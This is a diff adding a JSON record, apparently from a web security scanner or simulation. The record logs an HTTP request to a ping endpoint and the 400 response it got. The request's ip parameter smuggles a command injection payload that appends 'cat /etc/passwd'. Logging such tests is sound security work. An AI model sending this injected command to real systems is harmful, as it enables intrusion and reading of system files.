@@ -1,0 +1,15 @@
+{
+  "request": {
+    "url": "engine_simulation",
+    "full_http_request": "GET /api/ping?ip=8.8.8.8;cat /etc/passwd HTTP/1.1\nHost: www.testfire.net\nUser-Agent: EvilBot/1.0\nConnection: keep-alive"
+  },
+  "response": {
+    "statusCode": 200,
+    "httpResponseContent": "HTTP/1.1 400 Bad Request\r\nServer: Apache-Coyote/1.1\r\nTransfer-Encoding: chunked\r\nDate: Tue, 06 Jan 2026 12:07:36 GMT\r\nConnection: close\r\n\r\n0\r\n\r\n"
+  },
+  "meta": {
+    "isPipeline": false
+  },
+  "recordId": "0d10c571d63747e78e82931b0915bd7e",
+  "timestamp": "2026-01-06 20:07:36"
+}
